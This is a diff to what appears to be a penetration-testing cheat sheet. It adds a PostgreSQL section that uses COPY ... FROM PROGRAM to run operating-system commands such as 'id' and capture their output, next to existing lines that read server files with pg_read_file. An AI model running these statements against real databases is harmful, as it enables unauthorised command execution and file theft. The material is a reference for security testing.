@@ -661,6 +661,15 @@ postgres=# \q                        // quit
 <DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --    // read a file
 ```
 
+### Numbered Output
+
+```console
+--COPY (SELECT '') TO PROGRAM 'sleep 2'
+--CREATE TEMP TABLE cmd_out(id serial, line text);
+COPY cmd_out(line) FROM PROGRAM 'id';
+SELECT * FROM cmd_out;
+```
+
 ### Postgres Remote Code Execution
 
 > https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-to-program
